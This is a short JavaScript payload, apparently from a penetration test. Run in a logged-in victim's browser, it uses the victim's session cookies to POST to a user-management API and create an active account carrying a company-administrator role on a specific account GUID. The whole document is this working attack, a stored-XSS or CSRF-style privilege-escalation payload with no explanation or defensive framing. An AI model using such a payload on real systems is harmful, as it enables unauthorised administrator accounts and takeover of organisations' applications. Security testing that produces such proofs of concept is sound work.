async function saveUser() {
  const formData = new FormData();

  formData.append("FirstName", "thoroxss1337");
  formData.append("LastName", "thoroxss1337");
  formData.append("textbox-e", "dux-yama1337@thoropentests.com");
  formData.append("UserID", "");
  formData.append("User_Phone", "(234) 343-5450");
  formData.append("textbox-p", "");
  formData.append("RoleName", "18");
  formData.append("AccountGUID", "B8FD4CC9-E2F4-4AE7-9B6A-3E72360A0E14");
  formData.append("workordertypes", "");
  formData.append("AdditionalRoles", "TRADEPROVIDER_COMPANYADMIN");
  formData.append("IsActive", "true");

  const res = await fetch("/api/user/saveuser", {
    method: "POST",
    credentials: "include", // sends cookies automatically
    body: formData
  });

  const text = await res.text();
  console.log("Response:", res.status, text);
}

saveUser();
